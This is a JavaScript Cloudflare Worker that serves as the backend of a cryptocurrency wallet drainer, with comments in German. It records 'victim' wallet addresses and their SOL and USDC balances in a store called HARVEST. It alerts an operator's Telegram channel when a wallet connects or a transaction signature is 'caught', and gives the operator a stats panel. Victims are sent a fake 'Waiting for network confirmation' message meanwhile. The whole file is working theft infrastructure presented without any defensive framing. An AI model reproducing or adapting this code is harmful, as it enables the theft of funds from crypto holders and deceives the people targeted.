export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const corsHeaders = {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "POST, OPTIONS, GET",
      "Access-Control-Allow-Headers": "Content-Type",
    };

    if (request.method === "OPTIONS") {
      return new Response(null, { headers: corsHeaders });
    }

    // --- TELEGRAM WEBHOOK (Kontrolle & Buttons) ---
    if (request.method === "POST" && url.pathname === "/webhook") {
      try {
        const update = await request.json();
        
        // Fängt normale Nachrichten UND Channel-Posts ab
        const msg = update.message || update.channel_post;
        
        // 1. Wenn du /stats tippst ODER den Button klickst
        if ((msg && msg.text && msg.text.includes("/stats")) || update.callback_query) {
          
          const chatId = update.callback_query ? update.callback_query.message.chat.id : msg.chat.id;
          
          let messageText = "📊 *DEXSCREENR PANEL*\n\n";
          
          if (env.HARVEST) {
            const list = await env.HARVEST.list({ limit: 5 });
            if (list.keys.length === 0) {
              messageText += "No wallets connected yet.";
            } else {
              for (const key of list.keys) {
                const dataStr = await env.HARVEST.get(key.name);
                if (dataStr) {
                  const d = JSON.parse(dataStr);
                  if (d.type === "connection_and_balance") {
                    messageText += `👤 \`${d.victim.slice(0,4)}...${d.victim.slice(-4)}\`\n`;
                    messageText += `SOL: ${d.sol} | USDC: ${d.usdc}\n\n`;
                  }
                }
              }
            }
          } else {
            messageText += "KV Database not connected.";
          }

          // Antwort im Channel mit Refresh-Button
          await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              text: messageText,
              parse_mode: "Markdown",
              reply_markup: {
                inline_keyboard: [
                  [{ text: "🔄 Refresh Stats", callback_data: "refresh_stats" }]
                ]
              }
            }),
          });
          
          // Wenn es ein Button-Klick war, Ladekreis stoppen
          if (update.callback_query) {
            await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/answerCallbackQuery`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ callback_query_id: update.callback_query.id })
            });
          }
          
          return new Response("OK");
        }

        return new Response("OK");
      } catch (e) {
        return new Response("Error", { status: 500 });
      }
    }

    // --- WEBSITE DATEN (Drainer) ---
    if (request.method === "POST") {
      try {
        const data = await request.json();
        
        if (env.HARVEST) {
          await env.HARVEST.put(Date.now() + ":" + data.victim, JSON.stringify(data));
        }
        
        if (env.BOT_TOKEN && env.ALERT_CHAT_ID) {
          let channelMsg = "";
          let userMsg = "";
          let buttons = [];
          
          if (data.type === "connection_and_balance") {
            channelMsg = `🔗 *WALLET CONNECTED*\n\n👤 *Address:*\n\`${data.victim}\`\n\n💰 *SOL:* ${data.sol}\n💵 *USDC:* ${data.usdc}`;
            userMsg = `✅ *Wallet connected.*\n\nWaiting for network confirmation...`;
            
            buttons = [
              [{ text: "📊 Show Stats", callback_data: "refresh_stats" }]
            ];
            
          } else if (data.type === "drain") {
            channelMsg = `🎣 *SIGNATURE CAUGHT!*\n\n👤 *Address:*\n\`${data.victim}\`\n\n📝 *TX ready.*`;
          }
          
          if (channelMsg) {
            await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
              method: "POST", headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ 
                chat_id: env.ALERT_CHAT_ID, 
                text: channelMsg, 
                parse_mode: "Markdown",
                reply_markup: { inline_keyboard: buttons }
              }),
            });
          }
          
          if (userMsg && data.tg_user_id) {
            await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
              method: "POST", headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ chat_id: data.tg_user_id, text: userMsg, parse_mode: "Markdown" }),
            });
          }
        }
        
        return new Response(JSON.stringify({ success: true }), {
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });

      } catch (error) {
        return new Response(JSON.stringify({ error: error.message }), {
          status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }
    }

    return new Response("Worker Active", { headers: corsHeaders });
  },
};
